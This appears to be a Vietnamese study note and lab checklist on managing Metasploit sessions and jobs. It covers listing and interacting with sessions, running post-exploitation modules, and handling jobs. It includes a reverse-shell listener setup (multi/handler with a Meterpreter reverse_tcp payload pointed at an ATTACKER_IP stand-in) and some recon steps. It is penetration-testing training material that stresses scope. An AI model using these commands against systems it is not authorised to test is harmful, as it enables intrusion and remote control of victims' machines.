# Metasploit Sessions and Jobs

## Sessions

Session là kênh tương tác giữa Metasploit và target sau khi payload thiết lập kết nối thành công.

Ví dụ:

- Meterpreter session
    
- Command shell session
    

Xem các session:

```text
sessions
```

Tương tác với session:

```text
sessions -i <SESSION_ID>
```

Ví dụ:

```text
sessions -i 1
```

Đưa Meterpreter session xuống background:

```text
background
```

Hoặc:

```text
Ctrl + Z
```

Sau khi background, session thường vẫn duy trì và có thể quay lại bằng `sessions -i`.

Session có thể chết nếu:

- Target reboot
    
- Payload/process bị terminate
    
- Network bị ngắt
    
- Firewall/EDR chặn
    
- Payload gặp lỗi
    

## Chạy Post Module trên Session

Workflow:

```text
Exploit thành công
→ có session
→ background session
→ chọn post module
→ set SESSION
→ run
```

Ví dụ:

```text
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

Post module thường dùng `SESSION`, không dùng `RHOSTS`.

## Jobs

Job là tác vụ Metasploit đang chạy nền.

Ví dụ:

- Reverse TCP handler
    
- Scanner
    
- Passive module
    
- Exploit chạy với `-j`
    

Job không đồng nghĩa với session:

```text
Job = tác vụ phía Metasploit
Session = kênh điều khiển target
```

Một handler có thể chạy dưới dạng job nhưng chưa tạo session nếu chưa có target callback.

## Chạy Exploit dưới dạng Job

```text
exploit -j
```

Hoặc tùy module:

```text
run -j
```

Ví dụ:

```text
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT 4444
exploit -j
```

## Quản lý Jobs

Xem help:

```text
jobs -h
```

Liệt kê job:

```text
jobs -l
```

Xem chi tiết một job:

```text
jobs -i <JOB_ID>
```

Dừng một job:

```text
jobs -k <JOB_ID>
```

Dừng toàn bộ job:

```text
jobs -K
```

## Phân biệt ID

```text
sessions -i 1  → tương tác với Session ID 1
jobs -k 1      → dừng Job ID 1
```

Session ID và Job ID không phải cùng một loại ID.

## Handler

`exploit/multi/handler` dùng để chờ payload kết nối về. Nó không tự khai thác target.

Luồng reverse connection:

```text
Target chạy payload
→ Target kết nối tới LHOST:LPORT
→ Handler nhận kết nối
→ Metasploit tạo session
```

## Ghi nhớ

```text
Ctrl + Z / background = giữ session và quay lại msfconsole
exit                    = có thể đóng session hiện tại
jobs -k <ID>            = dừng background job
jobs -K                 = dừng toàn bộ jobs
```

Trước khi đóng handler hoặc session, cần kiểm tra:

```text
sessions
jobs -l
```

---
# Checklist làm lab

## Trước khi exploit

```
- [ ] Chọn đúng exploit.
- [ ] Chọn đúng payload.
- [ ] Kiểm tra `LHOST`.
- [ ] Kiểm tra `LPORT`.
- [ ] Kiểm tra target có thể kết nối tới attacker.
- [ ] Kiểm tra port listener chưa bị job khác chiếm.
- [ ] Xem job hiện tại:

      jobs -l
```

---

## Sau khi exploit thành công

```
- [ ] Xác nhận có session mới.
- [ ] Chạy:

      sessions

- [ ] Ghi lại Session ID.
- [ ] Kiểm tra loại session.
- [ ] Kiểm tra user hiện tại.
- [ ] Kiểm tra hostname.
- [ ] Không nhầm Session ID với Job ID.
```

Với Meterpreter:

```
getuid
sysinfo
pwd
```

---

## Background session

```
- [ ] Khi cần trở lại `msfconsole`, dùng:

      background

- [ ] Hoặc nhấn `Ctrl + Z`.
- [ ] Nếu được hỏi, xác nhận background session.
- [ ] Chạy `sessions` để chắc chắn session vẫn tồn tại.
```

---

## Quay lại session

```
- [ ] Xem session:

      sessions

- [ ] Tương tác:

      sessions -i <SESSION_ID>

- [ ] Xác nhận quay lại đúng target.
```

---

## Chạy post-exploitation module

```
- [ ] Background session.
- [ ] Chọn post module phù hợp.
- [ ] Chạy `show options`.
- [ ] Xác định module yêu cầu `SESSION`.
- [ ] Set đúng Session ID:

      set SESSION <ID>

- [ ] Đọc mô tả và tác động của module.
- [ ] Chỉ chạy module nằm trong scope.
- [ ] Chạy module:

      run
```

Ví dụ an toàn để khảo sát:

```
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

---

## Chạy handler dưới dạng job

```
- [ ] Chọn `exploit/multi/handler`.
- [ ] Set payload giống payload đã tạo.
- [ ] Set đúng LHOST.
- [ ] Set đúng LPORT.
- [ ] Chạy:

      exploit -j

- [ ] Xác nhận job đã được tạo.
- [ ] Kiểm tra:

      jobs -l
```

---

## Khi port bị chiếm

```
- [ ] Kiểm tra job:

      jobs -l

- [ ] Xác định job dùng port.
- [ ] Dừng job:

      jobs -k <JOB_ID>

- [ ] Kiểm tra lại:

      jobs -l

- [ ] Kiểm tra port nếu cần:

      ss -lntp
```

---

## Khi session chết

```
- [ ] Kiểm tra:

      sessions

- [ ] Kiểm tra target còn online không.
- [ ] Kiểm tra handler còn chạy không.
- [ ] Kiểm tra VPN/network.
- [ ] Kiểm tra target có reboot không.
- [ ] Kiểm tra payload process có bị terminate không.
- [ ] Kiểm tra LHOST/LPORT.
- [ ] Tạo session mới nếu cần và nếu scope cho phép.
```

---

## Kết thúc lab

```
- [ ] Xác định session nào còn cần giữ.
- [ ] Ghi lại evidence trước khi đóng session.
- [ ] Đóng session không còn sử dụng.
- [ ] Dừng handler/job không cần thiết.
- [ ] Kiểm tra:

      sessions
      jobs -l

- [ ] Không để listener mở ngoài ý muốn.
```